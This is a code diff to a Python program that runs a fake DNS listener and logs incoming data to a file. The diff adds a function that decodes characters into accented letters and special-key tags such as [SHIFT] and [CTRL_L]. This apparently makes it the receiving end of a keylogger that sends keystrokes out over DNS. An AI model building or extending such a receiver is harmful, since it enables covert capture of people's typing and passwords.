@@ -10,12 +10,46 @@ import time
 ###############################################################
 _DNS_ADDR = ('0.0.0.0', 9953)
 _FAKE_DOMAIN = '.example.com.'
-
-
 ###############################################################
 # Classes e Funções
 ###############################################################
+def treatments(data):
+    replacements = {
+        '´a': 'á',
+        '´e': 'é',
+        '´i': 'í',
+        '´o': 'ó',
+        '´u': 'ú',
+        '`a': 'à',
+        '`e': 'è',
+        '`i': 'ì',
+        '`o': 'ò',
+        '`u': 'ù',
+        '^a': 'â',
+        '^e': 'ê',
+        '^i': 'î',
+        '^o': 'ô',
+        '^u': 'û',
+        '~a': 'ã',
+        '~o': 'õ',
+        '¥': '[CAPS]',
+        'ß': '[NUMLOCK]',
+        '┤': '[WIN]',
+        '¤': '[TAB]',
+        '©': '[CTRL_L]',
+        'Þ': '[SHIFT]',
+        '¿': 'NONE'
+    }
+
+    for key, value in replacements.items():
+        data = data.replace(key, value)
+        print(data)
+
+    return data
+
 def write_on_file(path, data):
+    data = treatments(data)
+    print (data)
     with open(path, 'a') as file:
         file.write(data)
         file.close()
